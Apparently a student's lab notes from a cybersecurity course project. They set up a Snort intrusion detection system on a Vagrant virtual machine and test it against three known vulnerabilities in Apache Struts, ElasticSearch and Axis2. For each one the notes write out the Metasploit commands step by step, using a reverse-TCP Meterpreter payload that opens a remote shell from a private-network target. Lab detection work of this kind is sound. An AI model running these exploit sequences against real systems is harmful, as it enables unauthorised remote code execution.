cybersecurity base project 2 notes

<REMOTEHOST> = 192.168.0.3
<LOCALHOST> = 192.168.0.4
<SNORTINTERFACE> = 1

1. Vagrant destroy
2. Vagrant up
3. Install Snort 2.9.9.0 & snortrules-snapshot-2976
4. Install WinPCap 4.1.1
5. Snort conf changes
6. Test with C:\Snort\et\snort.exe -c C:\Snort\etc\snort.conf -i 1 -T 

snort test: C:\Snort\bin\snort -c c:\Snort\etc\snort.conf -T -i <SNORTINTERFACE>
snort IDS: C:\Snort\bin\snort -d -l C:\snort\log -i 1 -c c:\Snort\etc\snort.conf -A console
C:\Snort\bin\snort -de -l C:\snort\log -h 192.168.0.0/24 -i 1 -c c:\Snort\etc\snort.conf -A console
C:\Users\vagrant>C:\Snort\bin\snort -d -l C:\snort\log -i 1 -c c:\Snort\etc\snort.conf -A console

LHOST 172.28.128.4
RHOST 172.28.128.3

Ruleset: snortrules-snapshot-2976

Discovered
1. CVE-2016-3087 - Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution
	Prerequisites: Add 8282 to snort.conf HTTP_PORTS
	1. use exploit/multi/http/struts_dmi_rest_exec
	2. set RHOST <REMOTEHOST>
	3. set RPORT 8282
	4. set payload java/meterpreter/reverse_tcp
	5. set LHOST <LOCALHOST>
	6. run
	7. sysinfo

-----------------------------------------------
2. CVE-2014-3120 - ElasticSearch Dynamic Script Arbritrary Java Execution
	Preqrequisites: Uncomment line 812 in server-other.rules ("SERVER-OTHER ElasticSearch script remote code execution attempt")
	1. use exploit/multi/elasticsearch/script_mvel_rce
	2. set RHOST <REMOTEHOST>
	3. set payload java/meterpreter/reverse_tcp
	4. set LHOST <LOCALHOST>
	5. run
	6. sysinfo

3. CVE-2010-0219 - AXIS2 / SAP BusinessObjects Authenticated Code Execution (via SOAP)
	1. use exploit/multi/http/axis2_deployer
	2. set RHOST <REMOTEHOST>
	3. set RPORT 8282
	4. set payload java/meterpreter/reverse_tcp
	5. set LHOST <LOCALHOST>
	5. run
	6. sysinfo

	
